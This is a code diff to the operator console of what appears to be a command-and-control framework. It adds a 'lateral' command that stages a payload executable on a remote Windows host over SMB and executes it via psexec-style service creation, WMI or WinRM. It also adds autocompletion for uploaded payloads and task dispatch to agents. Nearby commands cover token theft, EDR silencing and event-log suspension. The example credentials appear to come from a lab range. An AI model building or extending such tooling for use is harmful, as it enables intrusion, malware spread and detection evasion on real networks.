@@ -5051,6 +5051,11 @@ const AC_COMMANDS = [
   ['httpivot stop',''],
   ['winrm exec','winrm exec <t> <u> <p> <cmd>'],
   ['winrm deploy','winrm deploy <t> <u> <p> <cradle>'],
+  // ── Lateral movement (stage + exec in one shot) ──────────────────────────
+  ['lateral','lateral <psexec|wmi|winrm> <host> <payload.exe> [DOMAIN\\user] [pass]'],
+  ['lateral psexec', 'lateral psexec <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB admin$ + servicio SCM'],
+  ['lateral wmi',    'lateral wmi    <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB C$ + WMI Win32_Process'],
+  ['lateral winrm',  'lateral winrm  <host> <payload.exe> [DOMAIN\\user] [pass]  — SMB C$ + Invoke-Command'],
   ['token-store steal','token-store steal <pid> — robar token de proceso y guardar en store'],
   ['token-store use','token-store use <id> — usar token del store'],
   ['token-store show','token-store show — listar tokens guardados'],
@@ -5089,6 +5094,7 @@ const AC_WIN_ONLY = new Set([
   'ishell','ishell cmd','ishell ps','ishell exit',
   'link start','link stop',
   'winrm exec','winrm deploy',
+  'lateral','lateral psexec','lateral wmi','lateral winrm',
   'token-store steal','token-store use','token-store show','token-store remove','token-store clear',
   'screenwatch start','screenwatch stop',
   'edr-silence','edr-silence-rm','eventlog-suspend','eventlog-resume',
@@ -5182,6 +5188,31 @@ function consoleAcUpdate() {
         return;
       }
       // fall through to subcommand / hint suggestions
+    }
+
+    // Lateral movement: file is 3rd arg — "lateral psexec <host> <partial>"
+    if (cmd === 'lateral') {
+      const rest = val.slice(spaceIdx + 1);       // "psexec 10.7.10.22 age"
+      const parts = rest.trimStart().split(' ');
+      if (parts.length >= 3) {
+        const partial = parts[2];
+        const matches = acUploads.filter(f => {
+          if (!f.startsWith(partial) || f === partial) return false;
+          return f.toLowerCase().endsWith('.exe') || f.toLowerCase().endsWith('.dll');
+        });
+        if (matches.length) {
+          acMatches = matches.map(f => [val.slice(0, val.lastIndexOf(partial)) + f, f]);
+          acIdx = -1;
+          const ac = document.getElementById('console-ac');
+          ac.innerHTML = acMatches.slice(0, 15).map(([, f], i) =>
+            `<div class="console-ac-item" data-idx="${i}" onmousedown="consoleAcPick(${i})">
+              <span class="ac-cmd">📄 ${esc(f)}</span><span class="ac-hint">upload</span>
+            </div>`
+          ).join('');
+          ac.classList.add('open');
+          return;
+        }
+      }
     }
 
     // File arg completion (inject is 2nd arg, others 1st)
@@ -6395,6 +6426,39 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     case 'download': taskType='DOWNLOAD'; taskArgs=JSON.stringify({path:args}); break;
     case 'minidump': taskType='MINIDUMP'; taskArgs=args; break;
     case 'port-scan': taskType='PORT_SCAN'; taskArgs=args; break;
+
+    // ── Lateral movement ───────────────────────────────────────────────────
+    // lateral <psexec|wmi|winrm> <host> <payload.exe> [DOMAIN\user] [pass]
+    case 'lateral': {
+      const lp = args.trim().split(/\s+/);
+      const lMethod = (lp[0] || '').toLowerCase();
+      if (!['psexec','wmi','winrm'].includes(lMethod) || lp.length < 3) {
+        addConsoleOutput(
+          'uso: lateral <método> <host> <payload.exe> [DOMAIN\\\\user] [pass]\n\n' +
+          'Métodos:\n' +
+          '  psexec  — copia via SMB admin$, ejecuta via SCM (service)\n' +
+          '  wmi     — copia via SMB C$,     ejecuta via WMI Win32_Process\n' +
+          '  winrm   — copia via SMB C$,     ejecuta via Invoke-Command\n\n' +
+          'Ejemplos:\n' +
+          '  lateral psexec 10.7.10.22 agent.exe\n' +
+          '  lateral psexec 10.7.10.22 agent.exe NORTH\\\\eddard.stark FightP3aceAndHonor!\n' +
+          '  lateral wmi    10.7.10.22 agent.exe sevenkingdoms\\\\cersei.lannister il0vejaime\n' +
+          '  lateral winrm  10.7.10.22 agent.exe NORTH\\\\jon.snow iknownothing\n' +
+          '  lateral psexec 10.7.10.22 agent.exe  (usa token actual — ya debe haber privilegio)',
+          '', null);
+        return;
+      }
+      taskType = 'LATERAL';
+      taskArgs = JSON.stringify({
+        method:  lMethod,
+        host:    lp[1],
+        payload: lp[2],
+        user:    lp[3] || '',
+        pass:    lp.slice(4).join(' ') || '',
+      });
+      break;
+    }
+
     case 'winrm': {
       const parts3 = args.split(' ');
       if (parts3[0] === 'exec' && parts3.length >= 5) {
